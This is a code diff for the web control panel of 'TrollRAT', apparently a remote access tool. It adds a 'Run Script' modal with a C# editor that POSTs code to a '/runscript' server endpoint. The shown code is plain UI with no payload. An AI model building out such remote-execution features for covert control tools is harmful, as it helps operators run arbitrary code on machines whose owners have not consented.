@@ -15,6 +15,11 @@
 	<!-- Latest compiled and minified JavaScript -->
 	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
 
+    <!-- CodeMirror for scripting support -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/mode/clike/clike.min.js"></script>
+
 	<style type="text/css">
 		body {
 			padding-top: 70px;
@@ -33,14 +38,14 @@
 					<span class="icon-bar"></span>
 					<span class="icon-bar"></span>
 				</button>
-				<a class="navbar-brand" href="#">TrollRAT</a>
+				<a class="navbar-brand" onclick="about();" href="#">TrollRAT</a>
 			</div>
 
 			<div class="collapse navbar-collapse" id="navbar">
-				<ul class="nav navbar-nav">
-					<li><button class="btn btn-default navbar-btn" onclick="about();">About</button></li>
-				</ul>
-			</div>
+                <ul class="nav navbar-nav navbar-right">
+                    <li><button class="btn btn-default navbar-btn" onclick="showEditor();">Run Script</button></li>
+                </ul>
+            </div>
 		</div>
 	</nav>
 
@@ -75,6 +80,23 @@
 				</div>
 			</div>
 		</div>
+
+        <div class="modal" id="scriptModal" tabindex="-1" role="dialog">
+            <div class="modal-dialog modal-lg">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+                        <h4 class="modal-title">Run Script</h4>
+                    </div>
+                    <div class="modal-body">
+                        <textarea class="form-control" rows="8" id="code"></textarea>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-primary" onclick="runScript();">Run Script</button>
+                    </div>
+                </div>
+            </div>
+        </div>
 	</div>
 
 	<script type="text/javascript">
@@ -198,6 +220,31 @@
 			}).error(function () {
 				showError("Server communication failed!");
 			});
+		}
+
+		codemirror = null;
+
+		function runScript() {
+		    $.ajax({
+		        method: "POST",
+		        url: "/runscript",
+		        data: codemirror.getValue()
+		    }).done(function (results) {
+		        alert(results);
+		    }).error(function () {
+		        showError("Server communication failed!");
+		    });
+		}
+
+		function showEditor() {
+		    $('#scriptModal').modal();
+            
+		    if (!codemirror) {
+		        codemirror = CodeMirror.fromTextArea($("#code")[0], {
+		            lineNumbers: true,
+		            mode: "text/x-csharp"
+		        });
+		    }
 		}
 
 		code = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
